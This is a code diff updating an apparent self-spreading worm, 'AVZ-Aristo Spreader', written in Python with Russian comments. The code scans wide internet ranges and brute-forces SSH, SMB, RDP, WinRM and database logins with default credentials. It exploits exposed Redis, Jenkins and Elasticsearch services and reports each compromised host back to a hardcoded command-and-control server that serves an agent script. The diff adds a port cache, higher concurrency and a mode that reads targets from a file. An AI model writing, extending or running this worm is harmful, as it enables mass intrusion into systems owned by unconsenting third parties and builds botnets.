@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# AVZ-Aristo Spreader v25.11.1 – полный, без сокращений
-import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, requests
+# AVZ-Aristo Spreader v25.12 – кэш портов, ускоренный скан, цели из файла
+import asyncio, aiohttp, random, socket, time, json, os, sys, argparse, ftplib, subprocess, ipaddress, logging, sqlite3, requests
 
 if sys.platform != 'win32':
     import resource
@@ -15,13 +15,12 @@ C2_HOST = "80.249.146.202"
 C2_PORT = 80
 API_PORT = 8080
 AGENT_URL = f"http://{C2_HOST}:{API_PORT}/agent_bash.sh"
-MAX_CONCURRENT = 500
+MAX_CONCURRENT = 800
 QUICK_TIMEOUT = 1.0
 BRUTE_TIMEOUT = 2.0
 DEFAULT_SCAN_COUNT = 20_000
 PORT_LIST = [21, 22, 1433, 3306, 3389, 445, 5432, 5985, 6379, 8080, 9200]
 
-# Базовые учётные данные (пополняются из success_creds.json)
 CREDS = [
     ("root","root"), ("root","admin"), ("root","password"), ("root","123456"),
     ("admin","admin"), ("admin","password"), ("admin","123456"),
@@ -34,6 +33,23 @@ SUCCESS_CREDS = []
 if os.path.exists(SUCCESS_CREDS_FILE):
     with open(SUCCESS_CREDS_FILE) as f:
         SUCCESS_CREDS = json.load(f)
+
+# Кэш открытых портов (SQLite)
+DB_FILE = "ports_cache.db"
+conn = sqlite3.connect(DB_FILE)
+c = conn.cursor()
+c.execute('''CREATE TABLE IF NOT EXISTS ports (ip text, port integer, seen integer, PRIMARY KEY (ip, port))''')
+conn.commit()
+
+PORT_CACHE_TTL = 3600
+
+def is_port_cached(ip, port):
+    c.execute("SELECT seen FROM ports WHERE ip=? AND port=? AND seen > ?", (ip, port, time.time() - PORT_CACHE_TTL))
+    return c.fetchone() is not None
+
+def cache_port(ip, port):
+    c.execute("INSERT OR REPLACE INTO ports VALUES (?, ?, ?)", (ip, port, int(time.time())))
+    conn.commit()
 
 TOP_RANGES = [
     "8.0.0.0/8", "13.0.0.0/8", "34.0.0.0/8", "35.0.0.0/8", "45.0.0.0/8",
@@ -48,7 +64,6 @@ GUARANTEED_IPS = [
 
 TARGET_COUNTRY = os.environ.get("SPREAD_COUNTRY", "").upper()
 
-# GeoIP через ip-api.com (бесплатно, до 45 запросов/мин)
 def get_country(ip):
     try:
         resp = requests.get(f"http://ip-api.com/json/{ip}", timeout=2)
@@ -95,9 +110,12 @@ def random_ip():
             return ip
 
 async def probe_port(ip, port):
+    if is_port_cached(ip, port):
+        return True
     try:
         _, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=QUICK_TIMEOUT)
         w.close(); await w.wait_closed()
+        cache_port(ip, port)
         return True
     except:
         return False
@@ -321,47 +339,36 @@ async def infect(ip, port_stats):
     for i, p in enumerate(ports):
         if open_ports[i]:
             port_stats[p] = port_stats.get(p, 0) + 1
-    # SMB (445)
     if open_ports[5] and await smb_brute(ip):
         print(f"[INFECTED] {ip} via SMB", flush=True)
         return True
-    # SSH (22)
     if open_ports[1] and await ssh_brute_ultra(ip):
         print(f"[INFECTED] {ip} via SSH", flush=True)
         return True
-    # WinRM (5985)
     if open_ports[7] and await winrm_brute(ip):
         print(f"[INFECTED] {ip} via WinRM", flush=True)
         return True
-    # MSSQL (1433)
     if open_ports[2] and await mssql_brute(ip):
         print(f"[INFECTED] {ip} via MSSQL", flush=True)
         return True
-    # MySQL (3306)
     if open_ports[3] and await mysql_brute(ip):
         print(f"[INFECTED] {ip} via MySQL", flush=True)
         return True
-    # PostgreSQL (5432)
     if open_ports[6] and await postgresql_brute(ip):
         print(f"[INFECTED] {ip} via PostgreSQL", flush=True)
         return True
-    # RDP (3389)
     if open_ports[4] and await rdp_brute(ip):
         print(f"[INFECTED] {ip} via RDP", flush=True)
         return True
-    # Redis (6379)
     if open_ports[8] and await exploit_redis(ip):
         print(f"[INFECTED] {ip} via Redis", flush=True)
         return True
-    # Jenkins (8080)
     if open_ports[9] and await exploit_jenkins(ip):
         print(f"[INFECTED] {ip} via Jenkins", flush=True)
         return True
-    # Elasticsearch (9200)
     if open_ports[10] and await exploit_elasticsearch(ip):
         print(f"[INFECTED] {ip} via Elasticsearch", flush=True)
         return True
-    # FTP (21)
     if open_ports[0] and await ftp_brute(ip):
         print(f"[INFECTED] {ip} via FTP", flush=True)
         return True
@@ -434,6 +441,13 @@ async def main_async(args):
     except Exception as e:
         print(f"[!] C2 unreachable: {e}", flush=True)
 
+    targets = []
+    if args.targets:
+        if os.path.exists(args.targets):
+            with open(args.targets) as f:
+                targets = [line.strip() for line in f if line.strip()]
+            print(f"[*] Loaded {len(targets)} targets from {args.targets}", flush=True)
+
     async def gui_progress(current, total, stats, port_stats):
         port_str = ", ".join(f"{p}: {c} open" for p, c in sorted(port_stats.items()))
         if port_str:
@@ -447,6 +461,12 @@ async def main_async(args):
             stats, port_stats = await local_scan(gui_progress)
             print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
             await asyncio.sleep(30)
+    elif targets:
+        print("[*] Mode: targets from file", flush=True)
+        while True:
+            stats, port_stats = await scan_cycle(targets, gui_progress)
+            print(f"Cycle: +{stats['success']} infected, {stats['fail']} failed", flush=True)
+            await asyncio.sleep(60)
     else:
         print(f"[*] Mode: global, {args.count} targets per cycle", flush=True)
         while True:
@@ -459,6 +479,7 @@ def main():
     group = parser.add_mutually_exclusive_group()
     group.add_argument('--count', type=int, default=DEFAULT_SCAN_COUNT)
     group.add_argument('--local', action='store_true')
+    group.add_argument('--targets', type=str, help='Path to targets file')
     args = parser.parse_args()
     try:
         asyncio.run(main_async(args))
